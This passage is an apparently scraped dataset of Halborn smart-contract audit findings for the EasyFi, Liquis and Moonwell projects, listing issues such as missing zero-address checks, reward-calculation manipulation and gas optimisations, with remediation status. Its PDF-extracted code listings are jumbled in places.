Code Location: FarmingFactory - Line #832 Listing 3: FarmingFactory.sol (Lines 832) 824 825 826 827 828 829 830 831 832 833 834 constructor ( address _rewardsToken , uint256 _farmingRewardsGenesis ) Ownable () require ( _farmingRewardsGenesis >= block . timestamp , \" FarmingFactory :: constructor : genesis too soon \" ); rewardsToken = _rewardsToken ; farmingRewardsGenesis = _farmingRewardsGenesis ; { } FarmingRewards - Line #618 Listing 4: FarmingRewards.sol (Lines 626,627) 618 619 620 621 622 623 624 constructor ( address _rewardsDistribution , address _rewardsToken , address _farmingToken , uint256 _rewardsDuration ) { rewardsToken = IERC20 ( _rewardsToken ); 15 625 626 627 628 } farmingToken = IERC20 ( _farmingToken ); rewardsDistribution = _rewardsDistribution ; rewardsDuration = _rewardsDuration ; Risk Level: Likelihood - 3 Impact - 1 Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. For example: Listing 5: Modifier.sol (Lines 2,3,4) 1 2 3 4 5 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract \" ); _; } Remediation Plan: SOLVED: EasyFi team added the address validation. 16 ", "labels": ["Halborn", "EasyFi_Farming", "Severity: Low"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Farming_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In the public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Also, methods do not necessarily have to be public if they are only called within the contract-in such case they should be marked internal. Affected Smart Contract Functions: FarmingFactory: deploy,notifyRewardAmounts,notifyRewardAmount Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you expect that the function will only be called externally and use public if you need to call the function internally. To sum up, all can access to public functions, external functions only can be accessed externally and internal functions can only be called within the contract. 17 Remediation Plan: SOLVED: of notifyRewardAmounts() function from public to external. visibility changed EasyFi team the deploy() and 18 ", "labels": ["Halborn", "EasyFi_Farming", "Severity: Informational"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Farming_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The the Contracts repository, using Farming In block.timestamp. not necessarily hold the current time, and may not be accurate. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. The block.timestamp contracts variable global does are Code Location: FarmingRewards.sol Line #645 Listing 6: FarmingRewards.sol (Lines ) 645 646 647 function lastTimeRewardApplicable () public view override returns ( uint256 ) { return Math . min ( block . timestamp , periodFinish ); } FarmingRewards.sol Line #745 Listing 7: FarmingRewards.sol (Lines ) 745 746 747 748 749 750 751 752 753 754 755 756 function notifyRewardAmount ( uint256 reward ) external override onlyRewardsDistribution updateReward ( address (0) ) { if ( block . timestamp >= periodFinish ) { rewardRate = reward . div ( rewardsDuration ); } else { uint256 remaining = periodFinish . sub ( block . timestamp ); uint256 leftover = remaining . mul ( rewardRate ); rewardRate = reward . add ( leftover ). div ( rewardsDuration ) 19 757 758 759 760 761 762 763 764 765 766 767 768 ; } uint256 balance = rewardsToken . balanceOf ( address ( this )); require ( rewardRate <= balance . div ( rewardsDuration ) , \" Provided reward too high \" ); lastUpdateTime = block . timestamp ; periodFinish = block . timestamp . add ( rewardsDuration ); emit RewardAdded ( reward ); } FarmingFactory.sol Line #824 Listing 8: FarmingFactory.sol (Lines ) 824 825 826 827 828 829 830 831 832 833 834 constructor ( address _rewardsToken , uint256 _farmingRewardsGenesis ) Ownable () require ( _farmingRewardsGenesis >= block . timestamp , \" FarmingFactory :: constructor : genesis too soon \" ); rewardsToken = _rewardsToken ; farmingRewardsGenesis = _farmingRewardsGenesis ; { } FarmingFactory.sol Line #881 Listing 9: FarmingFactory.sol (Lines ) 881 882 883 884 885 886 887 function notifyRewardAmount ( address farmingToken ) public { require ( block . timestamp >= farmingRewardsGenesis , \" FarmingFactory :: notifyRewardAmount : not ready \" ); FarmingRewardsInfo storage info = 20 888 889 890 891 892 893 894 895 896 897 898 899 900 901 902 903 904 905 906 907 908 909 910 farmingRewardsInfoByFarmingToken [ farmingToken ]; require ( info . farmingRewards != address (0) , \" FarmingFactory :: notifyRewardAmount : not deployed \" ); if ( info . rewardAmount > 0) { uint256 rewardAmount = info . rewardAmount ; info . rewardAmount = 0; require ( IERC20 ( rewardsToken ). transfer ( info . farmingRewards , rewardAmount ) , \" FarmingFactory :: notifyRewardAmount : transfer failed \" ); FarmingRewards ( info . farmingRewards ). notifyRewardAmount ( rewardAmount ); } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. 21 Remediation Plan: NOT APPLICABLE: EasyFi team claims that the use of block.timestamp is deliberated. In addition, the timescale in farming contract is higher than 900 seconds. ", "labels": ["Halborn", "EasyFi_Farming", "Severity: Informational"]}, {"title": "LACK OF REWARD DURATION SETTER FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Farming_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In the FarmingRewards contract, rewards duration have been set at the However, rewards duration can not be changed after the constructor. deploy. The requirements should be reviewed by EasyFi Team. If they need change rewardsDuration after the period (periodFinish) finished they should implement functions via onlyRewardsDistribution role. Code Location: FarmingRewards.sol Line #645 Listing 10: FarmingRewards.sol (Lines 627) 618 619 620 621 622 623 624 625 626 627 628 constructor ( address _rewardsDistribution , address _rewardsToken , address _farmingToken , uint256 _rewardsDuration ) { } rewardsToken = IERC20 ( _rewardsToken ); farmingToken = IERC20 ( _farmingToken ); rewardsDistribution = _rewardsDistribution ; rewardsDuration = _rewardsDuration ; 22 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Review the requirements of the farming contract and If the setter function is required, the function should be implemented. Remediation Plan: ACKNOWLEDGED: EasyFi team claims that the use is deliberated because the duration will not be changed after the deployment. 23 ", "labels": ["Halborn", "EasyFi_Farming", "Severity: Informational"]}, {"title": "CONTROLLED PARAMETER CAN LEAD TO INVALID REWARD CALCULATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Liquis_EVM_Contracts_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "Some functions under FlashOptionsExerciser.sol such as claimAndExercise, claimAndLock, withdrawAndLock and earned do use an address array as a pa- rameter named _rewardPools. The array values are used as a IBaseRewardPool contract to fetch the earned amount. However, there is no validation This causes the earned returned on the parameters or white listing. value to be manipulated in those causing the exercising of the options to contain a higher amount. The _exerciseOptions function will initiate a flash loan, which will cause the executeOperation function to be trig- gered on return. At the end, the flashLoanSimple will be executing the executeOperation function, which does trigger the exercise on the olit token. The exercise function will do a transfer(address(0), amount); from the sender, in this case the FlashOptionsExerciser. The user data, corresponding to the manipulated amount will be used as the olitAmount on the olit exercise. Moreover, this means that if olit tokens are present on this contract, anyone could potentially perform a claim and exercise without even owning any reward on the pools. BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:N/Y:N/R:P/S:C (6.2) Recommendation: The olit exercise function will verify that the amount of tokens is valid before exercising. However, as the olit token was not part of the scope of the audit. Full assessment was not possible. However, by itself, the parameter allows full manipulation and the code should be modified to 14 verify the addresses of the pools Remediation plan: SOLVED: The code was changed to use pool IDs instead of addresses. A registry is kept up with the pools and verified against it. The contract is named Booster. 15 ", "labels": ["Halborn", "Liquis_EVM_Contracts", "Severity: Medium"]}, {"title": "EXERCISE DOES INCREASE THE EPOCH ALWAYS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Liquis_EVM_Contracts_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The PooledOptionsExerciser contract does allow calling exercise by anyone. This call does increment the totalWithdrawable for the current epoch and does increment the epoch. It will then transfer the amountIn of olit to the contract and amountOut of lit to the caller. However, if no amounts are transferred, for example having the amountOut being zero, the epoch will still increment, making it hard to track the epochs. BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:N/Y:N/R:N/S:C (3.1) Recommendation: It is recommended to check if the amounts are not zero. If they are, no epoch increment should happen. Remediation plan: SOLVED: The code is now checking if the amountOut == 0 and returning. 16 ", "labels": ["Halborn", "Liquis_EVM_Contracts", "Severity: Low"]}, {"title": "REWARD UPDATE SHOULD NOT HAPPEN DURING VESTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Liquis_EVM_Contracts_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The notifyRewardAmount function under PrelaunchRewardsPool can be called after the START_VESTING_DATE is reached. This can cause issues with the current vesting rewardRate and reward balances BVSS: AO:S/AC:L/AX:L/C:N/I:L/A:N/D:N/Y:N/R:N/S:C (0.6) Recommendation: It is recommended to add a onlyBeforeDate check with START_VESTING_DATE on the notifyRewardAmount function. Remediation plan: SOLVED: was START_VESTING_DATE added. code The changed and a modifier checking the 17 MANUAL REVIEW 18 4.1 PrelaunchRewardsPool.sol  onlyAuthorized does check for the msg.sender to be the owner, which by default is the contract deployer.  onlyAfterDate does check if block.timestamp is greater than the parameter date.  onlyBeforeDate does check if block.timestamp is less than the pa- rameter date.  stakeLit to the lit from does sender tokens transfer the PrelaunchRewardsPool contract. It then uses the LitDepositorHelper to call convertLitToBpt which internally does call _investBalToPool This latter does transfer on the abstract contract BalInvestor. Lit tokens from the caller, which will be PrelaunchRewardsPool to the BALANCER_VAULT pool id of BAL_ETH_POOL_ID. Once joining the pool BPT (BALANCER_POOL_TOKEN) tokens are transferred to the LitDepositorHelper which, if the balance is more than 0 are transferred to PrelaunchRewardsPool. Finally, the code does call _processStake with the BPT amount which does increase the total supply and the balances for the caller.  _processStake does call using a modifier updateReward for the re- ceiver. The updateReward does call rewardPerToken which will return 0 if totalSupply is 0. (rewardPerTokenStored will be 0 initially). The lastUpdateTime value will be set to either the block.timestamp or periodFinish, the smaller value, this means that past periodFinish no new rewards are produced. Finally, if the account is different from 0 (which will be used to just update reward) the earned function is called, and the value stored under rewards. rewardPerTokenStored will be stored under userRewardPerTokenPaid for the same account.  updateReward modifier does obtain the rewardPerToken which is based on the lastUpdateTime. If no new reward is updated with update, the old rewardPerTokenStored is returned. Thereafter, lastUpdateTime is updated with Math.min(block.timestamp, periodFinish). If the update is for an account, based on the new rewardPerToken the earnings are calculated and stored under rewards for the account. The last rate for the account is stored under userRewardPerTokenPaid.  stake does transfer the specified amount of stakingToken from the It then calls the caller to the PrelaunchRewardsPool contract. 19 W E I V E R L A U N A M _processStake function with the amount and the sender. This will update the totalSupply and balances[msg.sender]  stakeAll will do the same as stake but with the full balance of sender.  stakeFor does allow specifying who you are staking to. However, the stakingToken tokens are transferred from the callers balance.  The notifyRewardAmount does state in the description that no pull method is present. However, a safeTransferFrom is performed before the value updates.  The setOwner, setCrvDepositor , setVoterProxy, setRewardToken, recoverRenouncedLiq and recoverERC20 do use onlyAuthorized.  convert does use the crvDepositor to exchange BPT tokens for Liq tokens, it sets the balance to 0 on the reward pool, subtracts the total supply and sets the isVestingUser.  The notifyRewardAmount was allowed to be called after the vesting A new period, which could cause issues with the reward rate. onlyBeforeDate(START_VESTING_DATE) modifier was added.  convert does call updateReward.  The following idea was tested and verified: Calling claim when rewards[msg.sender] == 0 will cause an underflow and deadlock if claimed[msg.sender] != 0. 4.2 Liq.sol No issues found, direct fork of Aura. 4.3 LiqMinter.sol The contract does protect the Liq token minterMint function with a times- tamp of 3 years in the future. No issues found, direct fork of Aura. W E I V E R L A U N A M 20 4.4 LiqLocker.sol  The constructor does set the initial epoch based on rewardsDuration. Some 0 checks could be implemented.  notBlacklisted does verify if both of the address arguments are not blacklisted. The second argument is only checked if different from the first argument.  modifyBlacklist does allow the owner to change the blacklist flag for a given address. Only contract addresses are supported.  shutdown allows the owner to set the isShutdown flag.  Both recoverERC20 and addReward do restrict stakingToken as the token address.  setApprovals does set the approval for the same token and address twice, one reseting to 0 and the other to type(uint256).max.  lock does internally call _lock, the _lock function does verify that the sender and _account are not blacklisted. It also checks amount and shutdown flag. It uses the _amount and adds its value to the balance tracker locked value, adding also to total supply.  It then checks for the user locks array if any previous lock is present and already unlocked by time. If no lock is present or already unlocked, it pushes the new amount with the unlock time being the end of epoch.  If there is already a previous lock for this epoch, it adds the amount to it.  It then checks the delegatee for the caller account and incre- ments the delegateeUnlocks and adds a _checkpointDelegate. This should be double-checked to make sure that the delegatee cannot use the locked tokens as there is no unlock time verification like done when pushing LockedBalance.  Finally, it updates the epoch total supply.  _checkpointDelegate does accept an address and the addition/de- Votes are using to224 instead of to112 as the duction values. LockedBalance. 21 W E I V E R L A U N A M  delegate does verify that the address is not 0 and that the given delegatee is not the previous one. There is no way to reset or remove delegation. It will iterate over all pending userLocks for the upcoming epoch, remove them from the oldDelegatee and transfer them to newDelegatee. A checkpoint with deduction is stored for the old delegatee and with additions to the new delegatee.  _checkpointsLookup performs a binary search on the epoch and returns the DelegateeCheckpoint.  findEpochId does return the epoch id since the first epochs created since contract creation. It will underflow if the _time is prior contract creation. However, the compiler version will catch the bug.  totalSupplyAtEpoch does add all previous epoch supplies.  getReward does allow fetching the reward for any address, stacking is only allowed if the address is the sender.  The _skipIdx version does not check for cvxCrv and stake auto- matically.  getRewardFor does verify that the caller has permissions to grab rewards for the parameter account. It then transfers all rewards to the account but olit tokens, which are transferred to the caller. From the smart contract context, the olit tokens are transferred to authorized OptionsExerciser contracts.  queueNewRewards does only allow to be called by the approved dis- tributors.  _checkpointEpoch does verify if epoch times have passed though by using the current block.timestamp. If an epoch has passed, they are pushed with supply of 0 to the epoch array. 4.5 LiqVestedEscrow.sol Direct fork/renamed from Aura. 22 W E I V E R L A U N A M  fund will store for recipients the given amount of parameters. The total amount is transferred from the sender.  claim does directly allow locking your reward tokens via the LiqLocker.  cancel does set the totalLocked after the safeTransfer which could lead to a reentrancy if rewardToken is not safe/trusted. 4.6 ExtraRewardsDistributor.sol Direct fork/renamed from Aura. 4.7 FlashOptionsExerciser.sol  Constructor does approve oLIT token to spend all weth on this con- tract. It also approves balVault and litDepositorHelper to spend all LIT tokens from this contract.  setOwner does check for previous ownership acl.  exerciseAndLock does call _exerciseOptions which will skip flash loan if amount is zero. However, in case that anyone does transfer LIT tokens to this contract, _convertLitToLiqLit will be called and tokens deposited even if the amount specified on the parameter was zero as the balance of the contract is used for the deposit. Issues: _exerciseOptions should not rely on the _olitAmount of the parameter, since _rewardPools could be faked and the returned values wrongly used. executeOperation instead of decoding the params it should be using the balance of olit. At the end, the flashLoanSimple will be executing the executeOperation function, which does trigger the exercise on the olit token. The exercise function will do a transfer(address(0), amount); from the sender, in this case the FlashOptionsExerciser. This means that if olit tokens are present 23 W E I V E R L A U N A M on this contract, anyone could potentially perform a claim an exercise without even owning any reward on the pools. Same approach is followed on claimAndQueue in contracts/peripheral/ PooledOptionsExerciser.sol 4.8 PooledOptionsExerciser.sol  The queue function will store into a mapping of the user/epoch the amount of olit queued and also on the totalQueued. However, there is no check if the epoch should be updated or not. Probably assuming epoch will be manually updated on another function.  The claimAndQueue function will do the same as queue but claiming The balance funds from the provided reward pools as parameter. used to queue is the diff between the before claim and after claim balance.  The unqueue function, does allow removing from the last epoch and transfers it to the owner.  The _exerciseAmounts function does add to the olitOracle multiplier the fee amount based on the basis value.  The withdrawAndQueue and claimAndQueue does allow specifying the reward pool address. Issues: Code duplication: All functions do use the following snippet, it could be extracted into an internal function: Listing 1 1 2 queued [ msg . sender ][ epoch ] -= amount ; totalQueued [ epoch ] -= amount ; 24 W E I V E R L A U N A M 4.9 PoolMigrator.sol Direct fork/renamed from Aura. 4.10 BalLiquidityProvider.sol Direct fork/renamed from Aura. 4.11 BoosterHelper.sol Direct fork/renamed from Aura. 4.12 ClaimFeesHelper.sol Direct fork/renamed from Aura. 4.13 GaugeMigrator.sol Direct fork/renamed from Aura. 4.14 BalInvestor.sol contract implementing the Abstract BAL_ETH_POOL_ID. It does correctly compute the _getMinOut function, by weighting both amount and oracle prices with 1e18. The returned value is not weighted. approve join ways and to 25 W E I V E R L A U N A M 4.15 LitDepositorHelper.sol Does make use of BalInvestor to deposit and convert LIT, WETH or ETH to LIT/WETH and sends to the user BPT tokens from the joining of the pool.  The _depositFor function does check the asset deposited. It can be LIT, WETH or ETH. In the case of ETH the balance is first deposited on the WETH contract and wrapped. This is required as the _investSingleToPool does only accept two assets, LIT and WETH. 4.16 BaseRewardPool.sol (convex) Minor formatting changes from the convex fork. Added the getRewardFor function: - The function calls updateReward for the account parameter and then sends oLIT to OptionsExerciser 4.17 BaseRewardPool4626.sol Forked from Aura with changes. Implements the transfer function: - Allows tokenized pool deposits to be transferred 4.18 Permission.sol (convex) New contract added with whitelisting functionality on a caller. It does allow calling modifyPermission to set a parameter caller as allowed on behalf of msg.sender actions such as getRewardFor on BaseRewardPool. 26 W E I V E R L A U N A M THANK YOU FOR CHOOSING", "labels": ["Halborn", "Liquis_EVM_Contracts", "Severity: Informational"]}, {"title": "OLD TOKENS ARE NOT RECOVERABLE WHEN THE NEW TOKEN IS SET", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf", "body": "The privileged address can set the token. However, when the token is set to another address, the old tokens cannot be retrieved using the contract. Scenario:  Admin sets allocation via setAllocations function.  After the time, the user claims allocations.  Admin sets new token on the contract.  Old tokens are not recoverable by the contract. The withdraw function only takes an amount of argument. Code Location: Listing 1: TokenSaleDistributor.sol 197 function setTokenAddress ( address newTokenAddress ) external  adminOnly { 198  ; 199 200 } require ( tokenAddress == address (0) , \" Address already set \" ) tokenAddress = newTokenAddress ; Risk Level: Likelihood - 3 Impact - 3 17 Recommendation: Consider adding the following function for the accidental setTokenAddress function call. Listing 2 function withdraw ( address token , uint amount ) external IERC20 ( token ). safeTransfer ( admin , amount ); 1  adminOnly { 2 3 } Remediation Plan: SOLVED: The Moonwell Team solved this issue by implementing the withdraw function in the TokenSaleDistributor.sol contract. Commit ID: Commit ID 18 ", "labels": ["Halborn", "Moonwell_Finance_Token_Sale_and_Comptroller_Updates", "Severity: Medium"]}, {"title": "EXPIRED TOKENS ARE NOT CONSIDERED IN THE VOTING POWER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf", "body": "During the code review, It has been observed that expired tokens are not included in the voting power. Although the expired tokens are not used in the contract depends on the protocol behavior that can directly affect voting. The voting power should be carefully designed with expired tokens. Code Location: Listing 3: TokenSaleDistributor.sol 195 function totalVotingPower ( address user ) public view returns (  uint ) { 196 197 198 199 } uint totalAllocatedToUser = totalAllocated ( user ); uint totalClaimedByUser = totalClaimed ( user ); return totalAllocatedToUser - totalClaimedByUser ; Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to check all token features in the voting power. If the expired tokens are not used, the related code section should be removed from the code base. 19 Remediation Plan: SOLVED: The Moonwell Team solved this issue by deleting expired tokens from the code base. Commit ID: Commit ID 20 ", "labels": ["Halborn", "Moonwell_Finance_Token_Sale_and_Comptroller_Updates", "Severity: Medium"]}, {"title": "OWNER CAN RESET ALLOCATIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf", "body": "During the code review, It has been noticed that the owner can delete all delegations from any account. Code Location: Listing 4: TokenSaleDistributor.sol 195 function resetAllocationsByUser ( address [] memory recipients )  external adminOnly { 196 197 198 199 uint length = recipients . length ; for ( uint i; i < length ; ++ i) { uint votingPower = totalVotingPower ( recipients [ i ]) ; _moveDelegates ( delegates [ recipients [ i ]] , address (0) ,  votingPower ); delete allocations [ recipients [ i ]]; 200 201 202 } } Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider, not deleting, voting power and allocations users with the resetAllocationsByUser function, however If It is not possible, It is recommended to carefully manage the owner accounts private key to avoid any potential risks of being hacked. In terms of short-term and long-term goal: 21  Time-lock with reasonable latency, e.g. 48 hours, for awareness on privileged operations.  Assignment of privileged roles to multi-signature wallets to prevent a single point of failure due to the private key. Remediation Plan: RISK ACCEPTED: The Moonwell Team states that they will do this if they found a critical vulnerability after deployment, and they needed to claw back all tokens to prevent them from being stolen. In that case, they will deploy a new contract and re-add the claims as well. On the other hand, The Moonwell Team commented the feature on the code with the following PR. Commit ID: Commit ID 22 ", "labels": ["Halborn", "Moonwell_Finance_Token_Sale_and_Comptroller_Updates", "Severity: Medium"]}, {"title": "MISSING ZERO ADDRESS CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf", "body": "The Token Sale contract has address fields in multiple functions. These functions are missing address validations. Each address should be val- This is also considered a best idated and checked to be non-zero. practice. During testing, it has been found that some of these inputs are not protected against using the address(0) as the target address. Code Location: Listing 5: TokenSaleDistributorProxy.sol (Lines 18,37) function setPendingAdmin ( address newAdmin ) public adminOnly { * Accept admin transfer from the current admin to the new . */ require ( msg . sender == pendingAdmin && pendingAdmin != } /* * pendingAdmin = newAdmin ; function acceptPendingAdmin () public { 18 19 20 21 22 23 24 25 26  address (0) , \" Caller must be the pending admin \" ); 27 28 29 30 31 32 33 34 35  contract address */ 36 37  public adminOnly { admin = pendingAdmin ; pendingAdmin = address (0) ; /* * } * Request a new implementation to be set for the contract . * * @param newImplementation New contract implementation function setPendingImplementation ( address newImplementation ) 23 pendingImplementation = newImplementation ; 38 39 40 } Recommendation: It is recommended to validate that each address input is non-zero. Remediation Plan: SOLVED: The Moonwell Team solved this issue by implementing zero address checks. Commit ID: Commit ID 24 ", "labels": ["Halborn", "Moonwell_Finance_Token_Sale_and_Comptroller_Updates", "Severity: Low"]}, {"title": "MISSING EVENTS FOR ADMIN ONLY FUNCTIONS THAT CHANGE CRITICAL PARAMETERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf", "body": "Admin-only functions that change critical parameters should emit events. Events allow you to capture changed parameters so that tools/interfaces off-chain can register those changes. Code Location: Listing 6: TokenSaleDistributor.sol function setTokenAddress ( address newTokenAddress ) external require ( tokenAddress == address (0) , \" Address already set \" ) tokenAddress = newTokenAddress ; 1  adminOnly { 2  ; 3 4 } Listing 7: TokenSaleDistributorProxy.sol function setPendingImplementation ( address newImplementation ) } /* * pendingImplementation = newImplementation ; * Accept pending implementation change */ 1  public adminOnly { 2 3 4 5 6 7 8 require ( msg . sender == pendingImplementation &&  pendingImplementation != address (0) , \" Only the pending  implementation contract can call this \"); 9 10 11 12 implementation = pendingImplementation ; pendingImplementation = address (0) ; function acceptPendingImplementation () public { } 25 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Add events to all admin functions that change critical parameters. Remediation plan: SOLVED: The Moonwell team solved the issue by adding events following the above recommendation. Commit ID: Commit ID 26 ", "labels": ["Halborn", "Moonwell_Finance_Token_Sale_and_Comptroller_Updates", "Severity: Low"]}, {"title": "UNNEEDED INITIALIZATION OF UINT256 VARIABLES TO 0", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf", "body": "Since i is an uint256, it is already initialized to 0. reassigns the 0 to i which wastes gas. uint256 i = 0 Code Location: TokenSaleDistributor.sol  Line 157: for (uint i = 0; i < recipients.length; i += 1){ Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended not to initialize uint256 variables to 0 to save gas. For example, use instead: for (uint256 i; i < recipients.length; ++i){. Remediation Plan: SOLVED: The Moonwell Team solved this issue by removing initialization. Commit ID: Commit ID 27 ", "labels": ["Halborn", "Moonwell_Finance_Token_Sale_and_Comptroller_Updates", "Severity: Low"]}, {"title": "USING ++I CONSUMES LESS GAS THAN I+=1 IN LOOPS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf", "body": "In the loop below, the variable i is incremented using i+=. It is known that, in loops, using ++i costs less gas per iteration than i+=1. Code Location: Listing 8 TokenSaleDistributor . sol ::31 => for ( uint i ; i < allocations [ msg 1  . sender ]. length ; i += 1) { 2  recipient ]. length ; i += 1) { 3  recipient ]. length ; i += 1) { 4  recipient ]. length ; i += 1) { 5  recipient ]. length ; i += 1) { 6  recipient ]. length ; i += 1) { 7  . length ; i += 1) { 8  length ; i += 1) { TokenSaleDistributor . sol ::59 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::71 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::83 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::95 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::107 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::157 => for ( uint i = 0; i < recipients TokenSaleDistributor . sol ::180 => for ( uint i ; i < recipients . Risk Level: Likelihood - 1 Impact - 1 28 Proof of Concept: For example, based on the following test contract: Listing 9: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i +=1) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } We can see the difference in gas costs: Risk Level: Likelihood - 1 Impact - 1 29 Recommendation: It is recommended to use ++i instead of i+=1 to increment the value of a uint variable within a loop. This does not just apply to the iterator variable. It also applies to increments made within the loop code block. Remediation Plan: SOLVED: The Moonwell Team solved this issue by following the above rec- ommendation. Commit ID: Commit ID 30 ", "labels": ["Halborn", "Moonwell_Finance_Token_Sale_and_Comptroller_Updates", "Severity: Informational"]}, {"title": "CACHING THE LENGTH IN THE FOR LOOPS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf", "body": "The solidity compiler will always read the length of the array during each iteration.  If it is a storage array, this is an additional sload operation (100 additional extra gas (EIP-2929) for each iteration except the first)  If it is a memory array, this is an extra mload operation (3 addi- tional gas for each iteration except the first),  If it is a calldata array, it is an extra calldataload operation (3 additional gas for each iteration except the first). Code Location: Listing 10 TokenSaleDistributor . sol ::31 => for ( uint i ; i < allocations [ msg 1  . sender ]. length ; i += 1) { 2  recipient ]. length ; i += 1) { 3  recipient ]. length ; i += 1) { 4  recipient ]. length ; i += 1) { 5  recipient ]. length ; i += 1) { 6  recipient ]. length ; i += 1) { 7  . length ; i += 1) { 8  length ; i += 1) { TokenSaleDistributor . sol ::59 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::71 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::83 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::95 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::107 => for ( uint i ; i < allocations [ TokenSaleDistributor . sol ::157 => for ( uint i = 0; i < recipients TokenSaleDistributor . sol ::180 => for ( uint i ; i < recipients . 31 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Caching expensive state variables would prevent re-reading from storage. Listing 11 1 uint length = arr . length ; 2 for ( uint i = 0; i < length ; i ++) { 3 4 } // do something that doesn 't change arr . length Remediation Plan: SOLVED: The Moonwell Team solved this issue by caching arrays. Commit ID: Commit ID 32 ", "labels": ["Halborn", "Moonwell_Finance_Token_Sale_and_Comptroller_Updates", "Severity: Informational"]}, {"title": "REVERT STRING SIZE OPTIMIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Token_Sale_and_Comptroller_Updates_Report_Halborn_Final.pdf", "body": "Shortening the revert strings to fit within 32 bytes will decrease de- ployment time gas and decrease runtime gas when the revert condition is met. Revert strings that are longer than 32 bytes require at least one addi- tional mstore, along with additional overhead to calculate memory offset, etc. Code Location: Listing 12: TokenSaleDistributor.sol 206 function becomeImplementation ( TokenSaleDistributorProxy proxy )  external { 207 require ( msg . sender == proxy . admin () , \" Only proxy admin can  change the implementation \"); 208 209 } proxy . acceptPendingImplementation () ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Shorten the revert strings to fit within 32 bytes. That will affect gas optimization. 33 Remediation Plan: ACKNOWLEDGED: The Moonwell Team acknowledged this issue. This is a long- tail gas estimation issue, and the Moonwell Team would rather have clean error messages than fix gas on a revert the user could have detected. 34 3.10 (HAL-10) MISSING CHECKS FOR NON-ZERO TRANSFER VALUE CALLS - INFORMATIONAL ", "labels": ["Halborn", "Moonwell_Finance_Token_Sale_and_Comptroller_Updates", "Severity: Informational"]}, {"title": "TRANSFERRED AMOUNT VERIFICATION MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", 